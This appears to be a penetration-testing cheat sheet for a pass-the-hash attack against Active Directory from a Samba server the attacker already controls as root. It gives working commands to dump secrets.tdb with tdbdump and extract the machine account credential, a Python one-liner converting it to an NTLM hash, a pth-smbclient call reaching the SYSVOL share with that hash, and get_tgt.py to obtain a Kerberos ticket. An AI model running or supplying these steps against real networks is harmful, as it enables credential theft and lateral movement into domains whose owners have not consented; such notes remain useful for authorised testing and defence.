# ------------------------------- start samba pass the hash overview ------------------------------- # 
    ==> Quick view: root privilege requried, new samba user is created, this information is usually stored
    in "secrets.tdb" file, in samba 4.7.4 on debian, 'secrets.tdb' file is stored in the /var/lib/samba/private/
    ==> V.I Note: attack valid on samba server that has trust relationship with Active Directory infrastructure.
# -------------------------------   end samba pass the hash overview ------------------------------- # 

# ------------------------------- start pass the hash attack ------------------------------- # 
    # ---------- |tools| ---------- #
        - tdbdump 
        - pth-smbclient: https://github.com/byt3bl33d3r/pth-toolkit
        - get_tgt.py: https://gist.github.com/bransh/90f2d5c4e35b1249477035ba26dc0087#file-get_tgt-py
            ==> example: https://medium.com/@br4nsh/from-linux-to-ad-10efb529fae9
    # ---------- |tdbdump| ---------- #
        ==> Quick View: gathering secrets.tdb
        
        tdbdump /var/lib/samba/private/secrets.tdb
                ==> explanation: dumping secrets.tdb and getting the following:
                    - domain
                    - NTLM UTF-8 encoded. 
    
    # ---------- |pth-smbclient| ---------- #
        ==> Quick View: A modified version of the passing-the-hash tool collection https://code.google.com/p/passing-the-hash/ 
        designed to be portable and work straight out of the box even on the most 'bare bones' systems.
        for test pass the hash purpose for the following services:
            - winexe
            - wmic
            - wmis
            - rpcclient
            - smbclient
            - smbget
            - net
        
        1st: echo "<UTF-8_value>" | python -c "import hashlib,binascii;print binascii.hexlify(hashlib.new('md4',binascii.unhexlify(raw_input().replace('\\\', '').replace('','')).decode('utf-8').encode('utf-16le')).digest())"
            ==> explanation: deccode UTF-8 to get NTLM.
        2nd: pth-smbclient -U '<domain>\<user>$%<NTLM>:<NTLM>' //<service_ip>/<dir>
            ==> explanation: The following image shows the access to the SYSVOL default share with the calculated NTLM hash (test purpose).

    # ---------- |get_tgt.py| ---------- #
        ==> Quick View: Obtain a TGT through NTLM
        python get_tgt.py -user <username> - domain <domain> -ntlm <NTLM_vlaue> -kdc <server_ip>
            ==> explanation: get kgt ticket from KDC to access resource such as <server_ip>
# ------------------------------- start pass the hash attack ------------------------------- # 